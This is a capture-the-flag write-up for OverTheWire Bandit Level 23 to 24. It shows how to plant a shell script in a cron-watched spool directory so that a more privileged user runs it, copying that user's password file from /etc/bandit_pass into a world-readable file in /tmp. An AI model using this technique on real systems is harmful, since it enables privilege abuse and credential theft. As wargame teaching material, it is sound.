# Bandit Level 23 → 24

## Objective

Retrieve the password for Bandit Level 24 by creating a script that is executed automatically by a scheduled Cron job.

---

## Challenge Description

A Cron job periodically executes and runs every script placed in the `/var/spool/bandit24/foo` directory. The objective is to create a custom shell script that copies the password file to a location where it can be accessed.

---

## Enumeration

I first inspected the Cron configuration to identify the scheduled job and the script responsible for executing files from the spool directory. After understanding its behavior, I created my own shell script, granted it execute permissions, and placed it in the monitored directory. Once the Cron job executed my script, it copied the password to a temporary file that I could read.

---

## Commands Used

Create a working directory:

```bash
mkdir /tmp/myscript

cd /tmp/myscript
```

Create the script:

```bash
nano script.sh
```

Script contents:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/<your_output_file>

chmod 644 /tmp/<your_output_file>
```

Make the script executable:

```bash
chmod +x script.sh
```

Copy the script:

```bash
cp script.sh /var/spool/bandit24/foo/
```

Wait for the Cron job to execute, then retrieve the password:

```bash
cat /tmp/<your_output_file>
```

---

## Explanation

- Created a custom shell script in a temporary working directory.
- The script copied the password file to a readable location inside `/tmp`.
- Granted the output file appropriate read permissions.
- Made the script executable.
- Copied the script into the directory monitored by the Cron job.
- Waited for the scheduler to execute the script automatically.
- Retrieved the password from the generated file.
